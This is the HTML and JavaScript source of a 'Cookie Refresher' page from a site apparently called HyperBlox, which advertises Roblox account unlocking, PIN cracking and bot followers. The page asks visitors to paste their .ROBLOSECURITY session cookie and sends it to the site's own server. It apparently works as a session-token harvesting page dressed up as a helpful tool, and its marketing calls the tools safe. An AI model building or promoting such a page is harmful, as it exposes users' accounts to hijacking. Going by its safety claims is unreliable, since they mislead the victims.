<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="HyperBlox">
    <meta name="description" content="HyperBlox - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
    <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
    <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta property="og:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu/">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
    <meta name="twitter:site" content="https://hyperblox.eu/">
    <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="HyperBlox">
    <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
    <title>Cookie Refresher - HyperBlox</title>
    <link rel="icon" type="image/png" href="https://undetectedgoons.lol/files/hyperblox.png">
    <link rel="shortcut icon" href="https://undetectedgoons.lol/files/hyperblox.ico">
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --dark: #0f172a;
            --darker: #020617;
            --darkest: #010510;
            --light: #f8fafc;
            --gray: #94a3b8;
            --glass: rgba(30,41,59,0.45);
            --glass-border: rgba(255,255,255,0.08);
            --transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
            --shadow-lg: 0 15px 50px rgba(0,0,0,0.25);
            --border-radius: 16px;
            --glow: 0 0 40px rgba(139,92,246,0.4);
        }

        body {
            font-family: 'Manrope', sans-serif;
            background: var(--darkest);
            color: var(--light);
            min-height: 100vh;
            margin: 0;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139,92,246,0.1) 0%, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139,92,246,0.1) 0%, transparent 50%);
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .glass-card {
            width: 100%;
            max-width: 500px;
            background: var(--glass);
            border-radius: var(--border-radius);
            padding: 40px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(12px);
            box-shadow: var(--shadow-lg), var(--glow);
        }

        .panel-header {
            margin-bottom: 30px;
            text-align: center;
        }

        .panel-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .panel-subtitle {
            color: var(--gray);
            font-size: 16px;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--primary-light);
            font-size: 18px;
        }

        .panel-input {
            width: 100%;
            padding: 16px 20px 16px 55px;
            background: rgba(15,23,42,0.7);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius);
            color: var(--light);
            font-size: 16px;
            transition: var(--transition);
            font-family: 'Manrope', sans-serif;
            height: 55px;
            box-sizing: border-box;
        }

        .panel-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(139,92,246,0.3);
        }

        .panel-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: var(--border-radius);
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            height: 55px;
            font-size: 16px;
        }

        .panel-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(139,92,246,0.4);
        }

        .swal2-popup {
            background: var(--darker) !important;
            border-radius: var(--border-radius) !important;
            border: 1px solid var(--glass-border) !important;
            box-shadow: var(--shadow-lg), var(--glow) !important;
            padding: 30px !important;
            width: 480px !important;
            max-width: 90% !important;
            backdrop-filter: blur(12px) !important;
        }

        .swal2-title {
            color: var(--light) !important;
            font-size: 24px !important;
            font-weight: 700 !important;
            margin-bottom: 15px !important;
        }

        .swal2-html-container {
            color: var(--gray) !important;
            font-size: 16px !important;
            margin: 0 0 20px !important;
        }

        .swal2-icon {
            width: 80px !important;
            height: 80px !important;
            margin: 0 auto 20px !important;
            border: 4px solid transparent !important;
        }

        .swal2-icon.swal2-success {
            color: #10b981 !important;
            border-color: rgba(16,185,129,0.3) !important;
        }

        .swal2-icon.swal2-error {
            color: #ef4444 !important;
            border-color: rgba(239,68,68,0.3) !important;
        }

        .swal2-actions {
            margin: 20px auto 0 !important;
            gap: 10px !important;
        }

        .swal2-confirm {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark)) !important;
            border-radius: 12px !important;
            padding: 12px 24px !important;
            font-weight: 600 !important;
            border: none !important;
            transition: var(--transition) !important;
        }

        .swal2-confirm:hover {
            transform: translateY(-2px) !important;
            box-shadow: 0 8px 20px rgba(139,92,246,0.4) !important;
        }

        .swal2-success .swal2-confirm {
            background: linear-gradient(135deg, #10b981, #0d9e6e) !important;
        }

        .swal2-success .swal2-confirm:hover {
            box-shadow: 0 8px 20px rgba(16,185,129,0.4) !important;
        }

        .cookie-display {
            width: 100%;
            background: rgba(15,23,42,0.7);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius);
            padding: 15px;
            color: var(--light);
            font-size: 14px;
            line-height: 1.5;
            margin: 15px 0;
            word-break: break-all;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
        }

        @media (max-width: 768px) {
            .glass-card {
                padding: 30px;
            }
            
            .panel-title {
                font-size: 24px;
            }
            
            .swal2-popup {
                width: 90% !important;
                padding: 25px !important;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="glass-card">
            <div class="panel-header">
                <h1 class="panel-title">Cookie Refresher</h1>
                <p class="panel-subtitle">Refresh your ROBLOSECURITY cookie</p>
            </div>
            
            <form id="cookieForm">
                <div class="input-group">
                    <i class="fas fa-cookie-bite input-icon"></i>
                    <input type="text" class="panel-input" id="cookie" name="cookie" placeholder="Paste .ROBLOSECURITY cookie" required>
                </div>
                
                <button type="submit" class="panel-btn">
                    <i class="fas fa-sync-alt"></i>
                    Refresh Cookie
                </button>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        document.getElementById('cookieForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const cookie = document.getElementById('cookie').value.trim();
            const btn = this.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
            btn.disabled = true;
            
            try {
                const response = await fetch('refresh.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'cookie=' + encodeURIComponent(cookie)
                });
                
                const data = await response.json();
                
                if (data.error) {
                    await Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error,
                        confirmButtonText: 'Retry',
                        background: 'var(--darker)',
                        customClass: {
                            confirmButton: 'swal2-confirm'
                        }
                    });
                } else {
                    const result = await Swal.fire({
                        icon: 'success',
                        title: 'Success',
                        html: `
                            <p>Your cookie has been refreshed successfully</p>
                            <div class="cookie-display">${data.cookie}</div>
                        `,
                        showCancelButton: true,
                        confirmButtonText: 'OK',
                        cancelButtonText: 'Copy',
                        background: 'var(--darker)',
                        customClass: {
                            confirmButton: 'swal2-confirm',
                            cancelButton: 'swal2-confirm'
                        }
                    });
                    
                    if (result.isDismissed) {
                        await navigator.clipboard.writeText(data.cookie);
                        await Swal.fire({
                            icon: 'success',
                            title: 'Copied!',
                            text: 'Cookie copied to clipboard',
                            confirmButtonText: 'OK',
                            background: 'var(--darker)',
                            customClass: {
                                confirmButton: 'swal2-confirm'
                            }
                        });
                    }
                }
            } catch (error) {
                await Swal.fire({
                    icon: 'error',
                    title: 'Connection Error',
                    text: 'Failed to connect to our servers',
                    confirmButtonText: 'Retry',
                    background: 'var(--darker)',
                    customClass: {
                        confirmButton: 'swal2-confirm'
                    }
                });
            } finally {
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>